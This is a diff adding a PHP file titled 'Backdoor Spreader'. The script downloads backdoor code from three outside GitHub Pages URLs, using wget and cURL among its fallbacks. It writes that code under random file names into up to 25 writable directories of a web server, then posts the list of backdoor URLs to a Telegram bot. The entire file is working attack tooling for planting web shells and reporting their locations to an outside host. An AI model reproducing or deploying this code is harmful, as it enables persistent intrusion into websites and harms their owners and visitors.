@@ -1,0 +1,189 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// Global variable to track the last used URL index
+$lastUrlIndex = -1;
+
+// Function to get the next URL in sequence
+function get_next_url() {
+    global $lastUrlIndex;
+    $urls = array(
+        'https://lambarzuani.github.io/gongshi.txt', 
+        'https://xlscls.github.io/library.txt',
+        'https://xlscls.github.io/baks.txt'
+    );
+
+    // Update the index to the next URL
+    $lastUrlIndex = ($lastUrlIndex + 1) % count($urls);
+
+    return $urls[$lastUrlIndex];
+}
+
+// Function to fetch content from a URL
+function read_content($url) {
+    // Attempt to use file_get_contents
+    $url_content = @file_get_contents($url);
+    if ($url_content !== false) {
+        return $url_content;
+    }
+
+    // If file_get_contents fails, use cURL
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $url_content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($url_content !== false) {
+        return $url_content;
+    }
+
+    // If cURL fails, use wget
+    $outputFile = tempnam(sys_get_temp_dir(), 'wget_');
+    $wgetCommand = "wget -qO $outputFile $url";
+    $result = shell_exec($wgetCommand);
+
+    if (file_exists($outputFile)) {
+        $url_content = file_get_contents($outputFile);
+        unlink($outputFile);
+        if ($url_content !== false) {
+            return $url_content;
+        }
+    }
+
+    // If wget fails, attempt using fopen and fread
+    $stream = @fopen($url, 'r');
+    if ($stream) {
+        $url_content = '';
+        while (!feof($stream)) {
+            $url_content .= fread($stream, 8192);
+        }
+        fclose($stream);
+        if ($url_content !== false) {
+            return $url_content;
+        }
+    }
+
+    // If all methods fail, return an error message
+    return "Gagal mengambil konten dari $url.";
+}
+
+// Function to generate a random name for the backdoor file
+function generateRandomName() {
+    $names = [...]; // Use the same array as in the original code
+    return $names[array_rand($names)];
+}
+
+// Function to send notification to Telegram
+function sendTelegramNotification($message) {
+    $botToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
+    $chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $postFields = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+
+    $ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $serverOutput = curl_exec($ch);
+    curl_close($ch);
+
+    return $serverOutput;
+}
+
+// Function to spread backdoor code
+function spreadBackdoor($dir, $backdoor_code, &$count, &$backdoorUrls, $domain) {
+    if ($count >= 25) return;
+
+    // Use RecursiveDirectoryIterator and RecursiveIteratorIterator with exception handling
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($iterator as $fileInfo) {
+            if ($fileInfo->isDir()) {
+                $subDir = $fileInfo->getRealPath();
+
+                // Check if the sub-directory is writable before proceeding
+                if (is_writable($subDir)) {
+                    $randomName = generateRandomName();
+                    $filePath = $subDir . DIRECTORY_SEPARATOR . $randomName;
+
+                    // Skip if the file already exists and continue to the next directory
+                    if (file_exists($filePath)) {
+                        continue;
+                    }
+
+                    // Write the backdoor code to the file
+                    file_put_contents($filePath, $backdoor_code);
+                    // Construct the URL for the created backdoor
+                    $bdPath = str_replace(dirname(__FILE__), '', realpath($filePath));
+                    $bdPath = str_replace('\\', '/', $bdPath); // Normalize path separators
+                    $url = $domain . $bdPath;
+
+                    // Add URL to backdoorUrls array
+                    $backdoorUrls[] = $url;
+
+                    $count++;
+                    if ($count >= 25) break;  // Stop if the maximum count is reached
+
+                    // Get the next URL for the next directory
+                    $backdoor_code = read_content(get_next_url());
+                }
+            }
+        }
+    } catch (UnexpectedValueException $e) {
+        // Handle the exception and skip directories that can't be accessed
+    }
+}
+
+// Main execution
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $domain = trim($_POST['domain']);
+    $dir = dirname(__FILE__);  // Replace with a specific directory if needed
+
+    $backdoorUrls = [];
+    $count = 0;
+
+    $initialUrl = get_next_url();  // Start with the first URL in sequence
+    $backdoor_code = read_content($initialUrl);
+
+    spreadBackdoor($dir, $backdoor_code, $count, $backdoorUrls, $domain);
+
+    // Send backdoor URLs to Telegram if any
+    if (!empty($backdoorUrls)) {
+        $backdoorMessage = "Backdoors created at:\n" . implode("\n", $backdoorUrls);
+        sendTelegramNotification($backdoorMessage);
+    }
+
+    echo "Operation completed. Check your Telegram for details.";
+} else {
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Backdoor Spreader</title>
+</head>
+<body>
+    <form method="POST">
+        <label for="domain">Enter Domain:</label>
+        <input type="text" id="domain" name="domain" required>
+        <button type="submit">Start</button>
+    </form>
+</body>
+</html>
+
+<?php
+}
+?>
